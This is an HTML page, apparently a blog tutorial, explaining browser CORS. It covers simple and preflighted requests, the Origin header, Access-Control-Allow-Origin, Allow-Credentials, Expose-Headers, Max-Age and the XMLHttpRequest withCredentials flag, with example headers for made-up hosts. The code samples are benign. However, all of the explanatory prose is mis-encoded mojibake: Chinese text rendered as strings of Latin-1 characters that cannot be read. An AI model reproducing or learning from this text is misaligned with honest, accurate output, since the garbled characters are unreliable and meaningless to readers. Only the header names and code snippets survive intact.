<h3 id="ä¸¤ç§è¯·æ±‚"><a href="#ä¸¤ç§è¯·æ±‚" class="headerlink" title="ä¸¤ç§è¯·æ±‚"></a>ä¸¤ç§è¯·æ±‚</h3><p>CORS è¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚</p>
<p>åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚</p>
<p>ï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ã€‚</p>
<blockquote>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
</blockquote>
<p>ï¼ˆ2ï¼‰HTTP çš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µã€‚</p>
<blockquote>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼<code>application/x-www-form-urlencoded</code>ã€<code>multipart/form-data</code>ã€<code>text/plain</code></li>
</ul>
</blockquote>
<p>å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äºéç®€å•è¯·æ±‚ã€‚ä¸€å¥è¯ï¼Œç®€å•è¯·æ±‚å°±æ˜¯ç®€å•çš„ HTTP æ–¹æ³•ä¸ç®€å•çš„ HTTP å¤´ä¿¡æ¯çš„ç»“åˆã€‚</p>
<p>è¿™æ ·åˆ’åˆ†çš„åŸå› æ˜¯ï¼Œè¡¨å•åœ¨å†å²ä¸Šä¸€ç›´å¯ä»¥è·¨åŸŸå‘å‡ºè¯·æ±‚ã€‚ç®€å•è¯·æ±‚å°±æ˜¯è¡¨å•è¯·æ±‚ï¼Œæµè§ˆå™¨æ²¿è¢­äº†ä¼ ç»Ÿçš„å¤„ç†æ–¹å¼ï¼Œä¸æŠŠè¡Œä¸ºå¤æ‚åŒ–ï¼Œå¦åˆ™å¼€å‘è€…å¯èƒ½è½¬è€Œä½¿ç”¨è¡¨å•ï¼Œè§„é¿ CORS çš„é™åˆ¶ã€‚å¯¹äºéç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šé‡‡ç”¨æ–°çš„å¤„ç†æ–¹å¼ã€‚</p>
<h3 id="ç®€å•è¯·æ±‚"><a href="#ç®€å•è¯·æ±‚" class="headerlink" title="ç®€å•è¯·æ±‚"></a>ç®€å•è¯·æ±‚</h3><h4 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h4><p>å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡º CORS è¯·æ±‚ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ª<code>Origin</code>å­—æ®µã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘ç°è¿™æ¬¡è·¨åŸŸ AJAX è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæ·»åŠ ä¸€ä¸ª<code>Origin</code>å­—æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å¤´ä¿¡æ¯ä¸­ï¼Œ<code>Origin</code>å­—æ®µç”¨æ¥è¯´æ˜ï¼Œæœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªåŸŸï¼ˆåè®® + åŸŸå + ç«¯å£ï¼‰ã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚</p>
<p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å«<code>Access-Control-Allow-Origin</code>å­—æ®µï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œè¿™ç§é”™è¯¯æ— æ³•é€šè¿‡çŠ¶æ€ç è¯†åˆ«ï¼Œå› ä¸º HTTP å›åº”çš„çŠ¶æ€ç æœ‰å¯èƒ½æ˜¯200ã€‚</p>
<p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªä¸ CORS è¯·æ±‚ç›¸å…³çš„å­—æ®µï¼Œéƒ½ä»¥<code>Access-Control-</code>å¼€å¤´ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Allow-Origin</code></strong></p>
<p>è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ã€‚å®ƒçš„å€¼è¦ä¹ˆæ˜¯è¯·æ±‚æ—¶<code>Origin</code>å­—æ®µçš„å€¼ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ª<code>*</code>ï¼Œè¡¨ç¤ºæ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Allow-Credentials</code></strong></p>
<p>è¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€ Cookieã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookie ä¸åŒ…æ‹¬åœ¨ CORS è¯·æ±‚ä¹‹ä¸­ã€‚è®¾ä¸º<code>true</code>ï¼Œå³è¡¨ç¤ºæœåŠ¡å™¨æ˜ç¡®è®¸å¯ï¼Œæµè§ˆå™¨å¯ä»¥æŠŠ Cookie åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚è¿™ä¸ªå€¼ä¹Ÿåªèƒ½è®¾ä¸º<code>true</code>ï¼Œå¦‚æœæœåŠ¡å™¨ä¸è¦æµè§ˆå™¨å‘é€ Cookieï¼Œä¸å‘é€è¯¥å­—æ®µå³å¯ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰<code>Access-Control-Expose-Headers</code></strong></p>
<p>è¯¥å­—æ®µå¯é€‰ã€‚CORS è¯·æ±‚æ—¶ï¼Œ<code>XMLHttpRequest</code>å¯¹è±¡çš„<code>getResponseHeader()</code>æ–¹æ³•åªèƒ½æ‹¿åˆ°6ä¸ªæœåŠ¡å™¨è¿”å›çš„åŸºæœ¬å­—æ®µï¼š<code>Cache-Control</code>ã€<code>Content-Language</code>ã€<code>Content-Type</code>ã€<code>Expires</code>ã€<code>Last-Modified</code>ã€<code>Pragma</code>ã€‚å¦‚æœæƒ³æ‹¿åˆ°å…¶ä»–å­—æ®µï¼Œå°±å¿…é¡»åœ¨<code>Access-Control-Expose-Headers</code>é‡Œé¢æŒ‡å®šã€‚ä¸Šé¢çš„ä¾‹å­æŒ‡å®šï¼Œ<code>getResponseHeader(&#39;FooBar&#39;)</code>å¯ä»¥è¿”å›<code>FooBar</code>å­—æ®µçš„å€¼ã€‚</p>
<h4 id="withCredentials-å±æ€§"><a href="#withCredentials-å±æ€§" class="headerlink" title="withCredentials å±æ€§"></a>withCredentials å±æ€§</h4><p>ä¸Šé¢è¯´åˆ°ï¼ŒCORS è¯·æ±‚é»˜è®¤ä¸åŒ…å« Cookie ä¿¡æ¯ï¼ˆä»¥åŠ HTTP è®¤è¯ä¿¡æ¯ç­‰ï¼‰ï¼Œè¿™æ˜¯ä¸ºäº†é™ä½ CSRF æ”»å‡»çš„é£é™©ã€‚ä½†æ˜¯æŸäº›åœºåˆï¼ŒæœåŠ¡å™¨å¯èƒ½éœ€è¦æ‹¿åˆ° Cookieï¼Œè¿™æ—¶éœ€è¦æœåŠ¡å™¨æ˜¾å¼æŒ‡å®š<code>Access-Control-Allow-Credentials</code>å­—æ®µï¼Œå‘Šè¯‰æµè§ˆå™¨å¯ä»¥å‘é€ Cookieã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ï¼Œå¼€å‘è€…å¿…é¡»åœ¨ AJAX è¯·æ±‚ä¸­æ‰“å¼€<code>withCredentials</code>å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨è¦æ±‚å‘é€ Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚</p>
<p>ä½†æ˜¯ï¼Œæœ‰çš„æµè§ˆå™¨é»˜è®¤å°†<code>withCredentials</code>å±æ€§è®¾ä¸º<code>true</code>ã€‚è¿™å¯¼è‡´å¦‚æœçœç•¥<code>withCredentials</code>è®¾ç½®ï¼Œè¿™äº›æµè§ˆå™¨å¯èƒ½è¿˜æ˜¯ä¼šä¸€èµ·å‘é€ Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­<code>withCredentials</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.withCredentials &#x3D; false;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæœåŠ¡å™¨è¦æ±‚æµè§ˆå™¨å‘é€ Cookieï¼Œ<code>Access-Control-Allow-Origin</code>å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ã€ä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookie ä¾ç„¶éµå¾ªåŒæºæ”¿ç­–ï¼Œåªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„ Cookie æ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„ Cookie å¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨åŸŸï¼‰åŸç½‘é¡µä»£ç ä¸­çš„<code>document.cookie</code>ä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„ Cookieã€‚</p>
<h3 id="éç®€å•è¯·æ±‚"><a href="#éç®€å•è¯·æ±‚" class="headerlink" title="éç®€å•è¯·æ±‚"></a>éç®€å•è¯·æ±‚</h3><h4 id="é¢„æ£€è¯·æ±‚"><a href="#é¢„æ£€è¯·æ±‚" class="headerlink" title="é¢„æ£€è¯·æ±‚"></a>é¢„æ£€è¯·æ±‚</h4><p>éç®€å•è¯·æ±‚æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æå‡ºç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹æ³•æ˜¯<code>PUT</code>æˆ–<code>DELETE</code>ï¼Œæˆ–è€…<code>Content-Type</code>å­—æ®µçš„ç±»å‹æ˜¯<code>application/json</code>ã€‚</p>
<p>éç®€å•è¯·æ±‚çš„ CORS è¯·æ±‚ï¼Œä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡ HTTP æŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¸ºâ€œé¢„æ£€â€è¯·æ±‚ï¼ˆpreflightï¼‰ã€‚æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•ä¹‹ä¸­ï¼Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº› HTTP æ–¹æ³•å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰å¾—åˆ°è‚¯å®šç­”å¤ï¼Œæµè§ˆå™¨æ‰ä¼šå‘å‡ºæ­£å¼çš„<code>XMLHttpRequest</code>è¯·æ±‚ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢è¿™äº›æ–°å¢çš„è¯·æ±‚ï¼Œå¯¹ä¼ ç»Ÿçš„æ²¡æœ‰ CORS æ”¯æŒçš„æœåŠ¡å™¨å½¢æˆå‹åŠ›ï¼Œç»™æœåŠ¡å™¨ä¸€ä¸ªæå‰æ‹’ç»çš„æœºä¼šï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æœåŠ¡å™¨æ”¶åˆ°å¤§é‡<code>DELETE</code>å’Œ<code>PUT</code>è¯·æ±‚ï¼Œè¿™äº›ä¼ ç»Ÿçš„è¡¨å•ä¸å¯èƒ½è·¨åŸŸå‘å‡ºçš„è¯·æ±‚ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€æ®µæµè§ˆå™¨çš„ JavaScript è„šæœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; &#39;http:&#x2F;&#x2F;api.alice.com&#x2F;cors&#39;;</span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;PUT&#39;, url, true);</span><br><span class="line">xhr.setRequestHeader(&#39;X-Custom-Header&#39;, &#39;value&#39;);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒHTTP è¯·æ±‚çš„æ–¹æ³•æ˜¯<code>PUT</code>ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªè‡ªå®šä¹‰å¤´ä¿¡æ¯<code>X-Custom-Header</code>ã€‚</p>
<p>æµè§ˆå™¨å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨å‘å‡ºä¸€ä¸ªâ€œé¢„æ£€â€è¯·æ±‚ï¼Œè¦æ±‚æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è¿™æ ·è¯·æ±‚ã€‚ä¸‹é¢æ˜¯è¿™ä¸ªâ€œé¢„æ£€â€è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>â€œé¢„æ£€â€è¯·æ±‚ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯<code>OPTIONS</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚å¤´ä¿¡æ¯é‡Œé¢ï¼Œå…³é”®å­—æ®µæ˜¯<code>Origin</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚</p>
<p>é™¤äº†<code>Origin</code>å­—æ®µï¼Œâ€œé¢„æ£€â€è¯·æ±‚çš„å¤´ä¿¡æ¯åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—æ®µã€‚</p>
<p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Request-Method</code></strong></p>
<p>è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥åˆ—å‡ºæµè§ˆå™¨çš„ CORS è¯·æ±‚ä¼šç”¨åˆ°å“ªäº› HTTP æ–¹æ³•ï¼Œä¸Šä¾‹æ˜¯<code>PUT</code>ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Request-Headers</code></strong></p>
<p>è¯¥å­—æ®µæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šæµè§ˆå™¨ CORS è¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µï¼Œä¸Šä¾‹æ˜¯<code>X-Custom-Header</code>ã€‚</p>
<h4 id="é¢„æ£€è¯·æ±‚çš„å›åº”"><a href="#é¢„æ£€è¯·æ±‚çš„å›åº”" class="headerlink" title="é¢„æ£€è¯·æ±‚çš„å›åº”"></a>é¢„æ£€è¯·æ±‚çš„å›åº”</h4><p>æœåŠ¡å™¨æ”¶åˆ°â€œé¢„æ£€â€è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº†<code>Origin</code>ã€<code>Access-Control-Request-Method</code>å’Œ<code>Access-Control-Request-Headers</code>å­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ HTTP å›åº”ä¸­ï¼Œå…³é”®çš„æ˜¯<code>Access-Control-Allow-Origin</code>å­—æ®µï¼Œè¡¨ç¤º<code>http://api.bob.com</code>å¯ä»¥è¯·æ±‚æ•°æ®ã€‚è¯¥å­—æ®µä¹Ÿå¯ä»¥è®¾ä¸ºæ˜Ÿå·ï¼Œè¡¨ç¤ºåŒæ„ä»»æ„è·¨æºè¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœåŠ¡å™¨å¦å®šäº†â€œé¢„æ£€â€è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½• CORS ç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µï¼Œæˆ–è€…æ˜ç¡®è¡¨ç¤ºè¯·æ±‚ä¸ç¬¦åˆæ¡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS http:&#x2F;&#x2F;api.bob.com HTTP&#x2F;1.1</span><br><span class="line">Status: 200</span><br><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;notyourdomain.com</span><br><span class="line">Access-Control-Allow-Method: POST</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„æœåŠ¡å™¨å›åº”ï¼Œ<code>Access-Control-Allow-Origin</code>å­—æ®µæ˜ç¡®ä¸åŒ…æ‹¬å‘å‡ºè¯·æ±‚çš„<code>http://api.bob.com</code>ã€‚</p>
<p>è¿™æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè®¤å®šï¼ŒæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>å¯¹è±¡çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚æ§åˆ¶å°ä¼šæ‰“å°å‡ºå¦‚ä¸‹çš„æŠ¥é”™ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLHttpRequest cannot load http:&#x2F;&#x2F;api.alice.com.</span><br><span class="line">Origin http:&#x2F;&#x2F;api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨å›åº”çš„å…¶ä»– CORS ç›¸å…³å­—æ®µå¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Allow-Methods</code></strong></p>
<p>è¯¥å­—æ®µå¿…éœ€ï¼Œå®ƒçš„å€¼æ˜¯é€—å·åˆ†éš”çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œè¿”å›çš„æ˜¯æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼Œè€Œä¸å•æ˜¯æµè§ˆå™¨è¯·æ±‚çš„é‚£ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ä¸ºäº†é¿å…å¤šæ¬¡â€œé¢„æ£€â€è¯·æ±‚ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Allow-Headers</code></strong></p>
<p>å¦‚æœæµè§ˆå™¨è¯·æ±‚åŒ…æ‹¬<code>Access-Control-Request-Headers</code>å­—æ®µï¼Œåˆ™<code>Access-Control-Allow-Headers</code>å­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µï¼Œä¸é™äºæµè§ˆå™¨åœ¨â€œé¢„æ£€â€ä¸­è¯·æ±‚çš„å­—æ®µã€‚</p>
<p><strong>ï¼ˆ3ï¼‰<code>Access-Control-Allow-Credentials</code></strong></p>
<p>è¯¥å­—æ®µä¸ç®€å•è¯·æ±‚æ—¶çš„å«ä¹‰ç›¸åŒã€‚</p>
<p><strong>ï¼ˆ4ï¼‰<code>Access-Control-Max-Age</code></strong></p>
<p>è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚ä¸Šé¢ç»“æœä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯20å¤©ï¼ˆ1728000ç§’ï¼‰ï¼Œå³å…è®¸ç¼“å­˜è¯¥æ¡å›åº”1728000ç§’ï¼ˆå³20å¤©ï¼‰ï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚</p>
<h4 id="æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”"><a href="#æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”" class="headerlink" title="æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”"></a>æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”</h4><p>ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡äº†â€œé¢„æ£€â€è¯·æ±‚ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·ï¼Œä¼šæœ‰ä¸€ä¸ª<code>Origin</code>å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨çš„å›åº”ï¼Œä¹Ÿéƒ½ä¼šæœ‰ä¸€ä¸ª<code>Access-Control-Allow-Origin</code>å¤´ä¿¡æ¯å­—æ®µã€‚</p>
<p>ä¸‹é¢æ˜¯â€œé¢„æ£€â€è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨çš„æ­£å¸¸ CORS è¯·æ±‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;cors HTTP&#x2F;1.1</span><br><span class="line">Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Host: api.alice.com</span><br><span class="line">X-Custom-Header: value</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0...</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å¤´ä¿¡æ¯çš„<code>Origin</code>å­—æ®µæ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„ã€‚</p>
<p>ä¸‹é¢æ˜¯æœåŠ¡å™¨æ­£å¸¸çš„å›åº”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;api.bob.com</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å¤´ä¿¡æ¯ä¸­ï¼Œ<code>Access-Control-Allow-Origin</code>å­—æ®µæ˜¯æ¯æ¬¡å›åº”éƒ½å¿…å®šåŒ…å«çš„ã€‚</p>
